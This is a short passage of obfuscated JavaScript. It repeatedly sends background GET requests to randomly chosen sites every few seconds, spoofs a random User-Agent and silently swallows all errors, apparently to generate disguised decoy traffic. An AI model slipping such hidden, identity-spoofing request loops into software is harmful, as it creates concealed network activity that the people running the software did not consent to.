    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x25b6 + -0x1 * 0x2a6e + 0x2010) * getRandomInt(-0x2029 * 0x1 + -0xa * -0x360 + -0x196, 0xe * 0x1f7 + 0x16ed + -0x1de * 0x1b));
}, -0xb5 * -0x35 + -0x1431 + -0x10e4);